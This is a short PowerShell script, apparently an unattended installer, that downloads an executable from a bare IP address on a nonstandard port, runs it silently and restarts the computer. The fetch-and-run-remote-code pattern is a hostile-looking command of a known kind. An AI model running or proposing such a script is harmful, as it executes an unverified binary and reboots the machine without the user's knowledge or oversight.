$url = "https://169.57.35.181:2015/setup2.exe"
$outfile = "c:\setup2.exe"
Invoke-WebRequest $url -outfile $outfile
start-Process -Wait -FilePath $outfile -ArgumentList '/s'
Restart-Computer
